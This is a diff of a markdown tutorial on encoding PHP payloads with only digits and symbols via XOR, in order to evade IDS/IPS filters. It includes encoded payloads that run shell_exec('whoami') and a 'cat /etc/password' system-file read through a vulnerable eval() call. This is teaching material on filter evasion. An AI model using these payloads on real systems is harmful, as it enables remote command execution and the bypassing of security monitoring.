@@ -7,7 +7,7 @@ description: This useful when you encounter IDS/IPS prevention which need to byp
 
 In this tutorial, I will cover PHP non-alpha encoder. I will show some basic concept first before we going deeper which may cause brain damage. muehehe <br>
 
-A 	| B 	| 	XOR A&B
+A     | B     |     XOR A&B
 --------|-------|-------------------
 0       | 0     |          0
 1       | 0     |          1
@@ -73,16 +73,16 @@ echo $\_\_($\_);  it actually same as echo shell\_exec('whoami'). <br>
 Hands-on time!!! , below code is vulnerable to php-nonalpha encoder,which limit us only to write number and some symbols. <br>
 ![Image 13](/images/PHP_Non-Alpha/Selection_012.png)<br><br>
 With same payload we craft before.Try to exploit eval function.<br>
-($\_ = ('7'^'@').('7'^'_').('/'^'@').(':'^'[').('@'^'-').('['^'2')) is define for whoami <br>
-($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=')) is define for shell_exec<br>
-($\_\_($\_)) is equal to shell\_exec('whoami')<br><br>
+($\_ = ('7'^'@').('7'^'_').('/'^'@').(':'^'[').('@'^'-').('['^'2')) is define for whoami .<br>
+($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=')) is define for shell_exec .<br>
+($\_\_($\_)) is equal to shell\_exec('whoami') .<br><br>
 eval('print '.($\_ = ('7'^'@').('7'^'\_').('/'^'@').(':'^'[').('@'^'-').('['^'2')).($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=')).($\_\_($\_)).";"); <br>
 I bracket for each variables define and execute it by calling ($\_\_($\_)) <br>
 ![Image 14](/images/PHP_Non-Alpha/Selection_013.png)<br><br>
 ![Image 14](/images/PHP_Non-Alpha/Selection_014.png)<br><br>
 
 
-try with other payload 'cat /etc/password' and arrange our payload back. <br>
+try with another payload 'cat /etc/password' and arrange our payload back. <br>
 
 ($\_ = ('8'^'[').('!'^'@').(')'^']').('['^'{')."/".(']'^'8').(']'^')').(']'^'>')."/".('^'^'.').('^'^'?').('\_'^',').('3'^'@').('7'^'@').('9'^']')).($\_\_= ('3'^'@').('3'^'[').('8'^']').(','^'@').('@'^',')."\_".('['^'>').(']'^'%').('^'^';').('^'^'=')).($\_\_($\_)) <br>
 
